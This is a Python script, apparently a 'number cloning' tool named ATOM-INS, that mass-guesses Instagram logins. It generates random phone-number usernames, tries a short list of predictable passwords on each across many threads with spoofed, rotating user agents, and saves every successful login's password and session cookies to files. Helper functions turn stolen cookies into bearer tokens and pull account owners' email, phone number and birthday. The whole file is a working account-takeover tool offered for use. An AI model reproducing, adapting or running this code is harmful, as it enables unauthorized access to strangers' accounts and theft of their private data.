import os
import sys
import time
import uuid
import json
import string
import random
import re
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
import random,datetime,pytz,base64

baru = []
for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Infinix ; Infinix X682B; Infinix-X682B; mt6769; tr_TR; {str(rr(422222222,499999999))})"
    uaz5 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Vivo ; V2111; 2111; mt6765; ru_KZ; {str(rr(422222222,499999999))})"
    uaz6 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Samsung ; SM-G935T; hero2qltetmo; qcom; en_US; {str(rr(422222222,499999999))})"
    uaz7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Xiomi ; Redmi K20; davinciin; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz8 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Iphone ; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz9 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; 5062 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Advan ; 5062; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uaz10 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; Poco ; M2102J20SG; vayu; qcom; it_IT; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3,uaz4,uaz5, uaz6,uaz7, uaz8, uaz9, uaz10]))
    baru.append(uainsta)

ugen = []
for typo in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 13; V2124 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; RMX3636 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
    uazku6 = f"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN;PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Quark/3.8.3.127 Mobile Safari/537.36"
    uazstart = str(rc([uazku1, uazku2, uazku3]))
    baru.append(uazstart)

for NazriXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   ATOM = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {ATOM} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   adtyaUAmain = rc([ugent1,ugent2,ugent3])
   ugen.append(adtyaUAmain)
    
instagram_user_agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)", "Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)", "Mozilla/5.0 (Linux; Android 5.0.2; 7048X Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.2; 320dpi; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)", "Mozilla/5.0 (Linux; Android 4.4.2; LG-D331 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 240dpi; 480x782; LGE/lge; LG-D331; luv80ss; mt6582; es_VE; 98288237)", "Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; pt_PT; pt-PT; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPad2,5; iPhone OS 9_3_5; pt_PT; pt-PT; scale=2.00; gamut=normal; 960x640)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,4; iOS 11_2_6; en_US; en-US; scale=2.88; gamut=wide; 1080x1920)", 
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,1; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone9,4; iOS 10_3_3; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_6; hu_HU; hu-HU; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (Linux; Android 7.0; SM-J730F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870; de_DE; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 37.0.0.9.96 (iPhone7,2; iOS 10_3_2; ru_RU; ru-RU; scale=2.00; gamut=normal; 750x1334)",
 "Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 98288242)", "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_2; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 560dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; uk_UA; 98288242)", "Mozilla/5.0 (Linux; Android 5.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-E500H; e53g; qcom; ru_RU; 98288239)", "Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a40 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; LENOVO/Lenovo; Lenovo A6020a40; A6020a40; qcom; ru_RU; 98288239)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)",
 "Mozilla/5.0 (Linux; Android 5.1; LG-H815 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 640dpi; 1440x2392; LGE/lge; LG-H815; p1; p1; uk_UA; 98288242)", "Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_0; ru_US; ru-US; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,2; iOS 11_2_5; uk_UA; uk-UA; scale=2.61; gamut=normal; 1080x1920)"]   

reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
loop = 0
idz = []
oks = []
cps = []
sys.stdout.write('\x1b[1;35m\x1b]2; ATOM-INS \x07')
try:os.mkdir('/sdcard/ATOM-INS')
except:pass
def ua_pro():
    window = random.choice(['11.0','8.0','10',',7.0'])
    a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
    build = random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
    chrome = str(random.randint(60,99))+".0."+str(random.randint(3300,3999))+"."+str(random.randint(75,99))
    browser = str(random.randint(35,99))+".1."+str(random.randint(2200,2900))+"."+str(random.randint(111111,199999))
    return ('Mozilla/5.0 (Windows NT {}; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} UBrowser/{} Safari/537.36'.format(window, chrome, browser))

def Fafo(cokie):
       try:
           H = "\033[32m"
           c = re.findall(r'csrftoken=([^;]+)', cokie)
           #print(c)
           x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken":c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = x).json()
           #print(r)
           if 'fbAccount' in str(r):
              nama = r['fbAccount']['display_name']
              Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              try:User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(Reqz)).group(1)
              except:User = None
           elif 'checkpoint_url' in str(r):
               nama = '\033[31mCP'
               User = '\033[31mCP'
           else:
              nama = None
              User = None
       except:
           nama = '\033[31mRequests Error!'
           User = '\033[31mRequests Error!'
       aku = '%s%s|%s'%(H,User, nama)
       return(aku)

def get_user_info(cookie):
        try:
            if(cookie is not None):bearer=bearer_from_cookie(cookie)
            if(bearer is not None):cookie=cookie
            r=requests.Session()
            r.cookies.update({"Cookie":cookie})
            r.headers.update({"User-Agent": useragent.instagram()})
            r.headers.update({"Authorization":bearer})
            r.headers.update({"X-IG-App-ID":"567067343352427"})
            u=r.get("https://i.instagram.com/api/v1/users/{}/info/".format(re.search("ds_user_id=(.*?);",str(cookie)).group(1))).json()['user']
            i=r.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true").json()['user']
            return{"profiles":i["pk_id"],"fullname":i["full_name"],"username":i["username"],"follower":str(u["follower_count"]),"followed":str(u["following_count"]),"feedpost":str(u["media_count"]),"biograph":i["biography"]or "","birthday":i["birthday"]or "","emailadd":i["email"]or "","phonenum":i["phone_number"]or "","genderno":str(i["gender"])or "","external":i["external_url"]or "","privates":i["is_private"],"verified":i["is_verified"],"pictures":i["hd_profile_pic_url_info"]["url"]}
        except Exception as e:
            pass

def bearer_from_cookie(cookie):
        try:
            params={"ds_user_id":re.search("ds_user_id=(.*?);",str(cookie)).group(1),"sessionid":re.search("sessionid=(.*?);",str(cookie)+";").group(1),"should_use_header_over_cookies":True}
            bearer=str(params).replace("'","\"").replace("True","true").replace(" ","")
            return "Bearer IGT:2:{}".format(base64.b64encode(bearer.encode("ascii")).decode("ascii"))
        except:
            return False


def logo():
    os.system('clear')
    print(f"""{white}
 CEO - SUMON ROY
-----------------------------------------------""")
 
def linex():
    print("\033[1;97m-----------------------------------------------")

def menu():
    logo()
    print(f"\033[1;97m [1] \033[1;92mIG Number Cloning")
    linex()
    opt_ = input(f" [+] Select Option : ")
    if opt_ in ['1','01']:
        random_number()
    elif opt_ in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        time.sleep(3)
        menu()
 
def random_number():
    logo()
    print(f" [+] Exp Codes : \033[1;92m7621,9121")
    linex()
    code = input(f" [+] Enter Code : ")
    try:
        logo()
        print(f" \033[1;97m[+] Exp Limit : \033[1;92m1000, 2000, 5000, 10000 ")
        linex()
        limit = int(input(f" \033[1;97m[+] Enter Limit : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=26) as KLEINXD:
        logo()
        total_idz = str(len(idz))
        print(f' \033[1;97m[+] Total IDs :\033[1;92m '+total_idz)
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200',uid[:6],uid[:8],uid] 
            KLEINXD.submit(ig_crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[+] Process Completed ")
    print(f" \033[1;97m[√] Total Ok : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[!] Total Cp : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[+] Press Enter To Back ")
    menu()

def ig_crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r\033[1;97m [ATOM-INS-XD] {loop}|{total_idz} |\033[1;92mok:{len(oks)}\033[1;97m")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            ua = random.choice(ugen)
            time_now = int(datetime.datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            cookies ={
            'csrftoken': csrftoken,
            'datr': 'y_MRaaJ8HwV_R9JTOXC2cdKM',
            'ig_did': str(uuid.uuid4()).upper(),
            'mid': 'aRHzzAALAAH30QLf11SvZ5PdgADa',
            'ig_nrcb': '1',
            'wd': '1183x773',}
            data = {
            'enc_password': enc_password,
            'caaF2DebugGroup': '0',
            'isPrivacyPortalReq': 'false',
            'loginAttemptSubmissionCount': '0',
            'optIntoOneTap': 'false',
            'queryParams': '{"hl":"en"}',
            'trustedDeviceRecords': '{}',
            'username': uid,
            'jazoest': '21821',}
            headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/accounts/login/?hl=en',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.60", "Google Chrome";v="142.0.7444.60", "Not_A Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-asbd-id': '359341',
            'x-csrftoken': csrftoken,
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1029643186',
            'x-requested-with': 'XMLHttpRequest',
            'x-web-device-id': '048502C5-4001-4BB4-8654-5B1CB4BB691E',
            'x-web-session-id': 'r64lx4:120e92:xjxzru',}
            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
            session_cookies = response.cookies.get_dict()
            if response.status_code == 200:
                json_response = response.json()
                if json_response.get('status') == 'ok':
                   if json_response.get('authenticated') == True:
                        kuki_ = ';'.join(['%s=%s' % (name, value) for name, value in response.cookies.get_dict().items()])
                        muid = re.search(r'ds_user_id=(\d+)', kuki_).group(1)
                        print(f"\r\033[1;92m [ATOM-INS-OK] {muid} | {pw}")
                        open("/sdcard/ATOM-INS/IG_NUB_OK.txt", "a").write(f"{uid}|{pw}|{kuki_}\n")
                        open("/sdcard/ATOM-INS/IG_OK.txt", "a").write(f"{muid}|{pw}|{kuki_}\n")
                        oks.append(muid)
                        return True
                   elif json_response.get('auth_token'):
                        kuki_ = ';'.join(['%s=%s' % (name, value) for name, value in response.cookies.get_dict().items()])
                        muid = re.search(r'ds_user_id=(\d+)', kuki_).group(1)
                        print(f"\r\033[1;92m [ATOM-INS-OK] {muid} | {pw}")
                        open("/sdcard/ATOM-INS/IG_NUB_OK.txt", "a").write(f"{uid}|{pw}|{kuki_}\n")
                        open("/sdcard/ATOM-INS/IG_OK.txt", "a").write(f"{muid}|{pw}|{kuki_}\n")
                        oks.append(muid)
                        return True
            elif 'sessionid' in session_cookies:
                kuki_ = ';'.join(['%s=%s' % (name, value) for name, value in response.cookies.get_dict().items()])
                muid = re.search(r'ds_user_id=(\d+)', kuki_).group(1)
                print(f"\r\033[1;92m [ATOM-INS-OK] {muid} | {pw}")
                open("/sdcard/ATOM-INS/IG_NUB_OK.txt", "a").write(f"{uid}|{pw}|{kuki_}\n")
                open("/sdcard/ATOM-INS/IG_OK.txt", "a").write(f"{muid}|{pw}|{kuki_}\n")
                oks.append(muid)
                return True
            else:
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except Exception as e:
        #print(e)
        pass
menu()
 
